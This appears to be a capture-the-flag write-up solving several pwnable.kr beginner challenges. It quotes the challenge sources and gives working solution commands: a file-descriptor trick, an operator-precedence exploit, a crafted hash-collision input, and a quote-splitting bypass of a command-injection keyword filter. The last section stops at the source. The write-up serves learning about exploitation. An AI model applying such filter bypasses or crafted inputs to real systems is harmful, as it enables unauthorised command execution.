# Pwnable
Where Nick tries to hack and constantly fails.

## Toddler's Bottle

### fd
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	// Convert argv[1] from ascii to int. Subtract hex 0x1234 from it.
	int fd = atoi( argv[1] ) - 0x1234; 
	int len = 0;
	
	// Read takes a file descriptor (fd) and reads the file descriptors content
	// into the buf(fer). If fd >2 then we will read from a possible file open
	// on the system, but, we also have some special file descriptors.
	// If fd = 0 we read from STDIN
	// fd = 1 is STDOUT
	// fd = 2 is STDERR
	// So if we want to read LETMEWIN\n into the buffer, we just need to make
	// fd = 0, and then type "LETMEWIN" into the terminal.
	len = read(fd, buf, 32); 
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;
}
```

We can't just pass ```0``` as the argument, because we subtract ```hex 0x1234``` from it. So we need to supply ```0x1234``` as the first argument so that when subtracted it will equal 0.

First, let's find out what ```0x1234``` is as an int.

```python
$ python -c "print(int(0x1234))"
4660
```

Great, so now all we should have to do is pass ```4660``` to the command, and then once it starts to read from STDIN we enter ```LETMEWIN\n```.

```bash
$ ./fd 4660
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
```

### mistake
Something to take note before starting this one is the challenge specifically says no fancy hacking skills required, and that it shouldn't be taken seriously.

Noteably, we get a very nice hint:
> hint : operator priority

So we already know right off the bat that we are probably performing some conditional check incorrectly. 

This particular block looks especially fishy:
```c
if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
	printf("can't open password %d\n", fd);
	return 0;
}
```
So in C the order that this is interpreted is:
1. function calls
2. relational operators (<>)
3. assignment operators(=)

Let's walk through this step by step...
1. We call open(), it could return >2 for a real fd, or a negative number for an error. 
2. We then check if open() < 0.
3. Then we assign that result to fd, which is an int.
4. If fd > 0, we run the conditional block.

What the hell does this all mean? If the password file exists, fd is not the file descriptor, but false! Which as an int equates to 0. A file descriptor of 0 is STDIN, so instead of comparing our password input to the stored password, we compare it to our other input! Ahahahaha!

There's just one final trick - each character of our second password input is XOR'd. 
```c
	// xor your input
	xor(pw_buf2, 10);
```
So whatever we put in for the second password needs to be the exact opposite of the first password. That's not too difficult, we can just put in 10 ```1```'s and 10 ```0```'s.

```bash
$ ./mistake
do not bruteforce...
1111111111
0000000000
input password : Password OK
Mommy, the operator priority always confuses me :(
```

### collision

```c
#include <stdio.h>
#include <string.h>
// This doesn't seem very secure...
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
    // Here we take the char pointer and convert it to an array of ints.
    // A char only takes up one byte, while ints take up 4 bytes.
    // The password is 20 characters long, 20/4 = 5.
    // So we are taking 20 characters, converting it to 5 ints, and 
    // summing them.
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i]; // Add each int to res.
	}
	return res;
}

int main(int argc, char* argv[]){
	if(argc<2){
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
	if(strlen(argv[1]) != 20){
		printf("passcode length should be 20 bytes\n");
		return 0;
	}

    // Does res returned by check_password() match the hashcode?
	if(hashcode == check_password( argv[1] )){
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}
```

This seems pretty simple conceptually, we just have to concoct some string of 20 characters that adds up to equal the hashcode. What is the hashcode anyways?

```bash
$ python -c "print(int(0x21DD09EC))"
568134124
```

So we just need some password that adds up to ```568134124``` in the check_password() function.

But.. how the hell do we do that? Let's just start off with some simple math.

```python
col@ubuntu:~$ python
Python 2.7.12 (default, Jul  1 2016, 15:12:24) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x21DD09EC
568134124
>>> 568134124 / 5
113626824
>>> float(568134124) / 5
113626824.8
```

Hmm.. this isn't equally divisible. We'll have to get fancy! Let's see what remainder we have if we multiply by the last number by 4.

```python
>>> 568134124 - (4 * 113626824)
113626828
```

Okay, so we need to do ```(113626824) * 4 + 113626828```

Now how the hell do we encode this as a string of characters? We can use the struct package to convert these int's to a string. But be careful, we need to encode these in little endian format (hence the ```<i```)

```python
>>> import struct
>>> (struct.pack('<i', 113626824)*4) + struct.pack('<i', 113626828)
'\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06'
```

So we should be able to just pass this to the command and get our flag!

```bash
$ ./col $(python -c "import struct; print((struct.pack('<i', 113626824)*4) + struct.pack('<i', 113626828))")
daddy! I just managed to create a hash collision :)
```

### cmd1
```c
$ /bin/cat cmd1.c
#include <stdio.h>
#include <string.h>

// Determines if string contains "flag", "sh", or "tmp".
// If so returns >1, otherwise 0.
int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/thankyouverymuch"); // Stomps on PATH :(
	if(filter(argv[1])) return 0; // End execution if filter() > 1
	system( argv[1] ); // Execute $1
	return 0;
}
```

We can't rely on path, so we have to specify exact path to executables. In this case we want /bin/cat.
We can't use "flag" directly, because it will cause our filter() function to return >1. 
We can use lots of quotes to bypass the filter. Such as: ```"f""l""a""g"```.

```bash
$ ./cmd1 "/bin/cat \"f\"\"l\"\"a\"\"g\""
mommy now I get what PATH environment is for :)
```

### Leg
```c
// leg.c
#include <stdio.h>
#include <fcntl.h>
int key1(){
    // Load pc (program counter) into register 3.
	asm("mov r3, pc\n"); 
}
int key2(){
	asm(
	"push	{r6}\n" // Push register 6 onto stack.
	"add	r6, pc, $1\n" // Add pc to r6
	"bx	r6\n" // Uhh???
	".code   16\n"
	"mov	r3, pc\n"
	"add	r3, $0x4\n"
	"push	{r3}\n"
	"pop	{pc}\n"
	".code	32\n"
	"pop	{r6}\n"
	);
}
int key3(){
	asm("mov r3, lr\n");
}
int main(){
	int key=0;
	printf("Daddy has very strong arm! : ");
	scanf("%d", &key); // Move stdin into key (as int).
	// If all three key functions added together equal key, print flag.
	if( (key1()+key2()+key3()) == key ){ 
		printf("Congratz!\n");
		int fd = open("flag", O_RDONLY);
		char buf[100];
		int r = read(fd, buf, 100);
		write(0, buf, r);
	}
	else{
	    // Otherwise print this.
		printf("I have strong leg :P\n");
	}
	return 0;
}
```
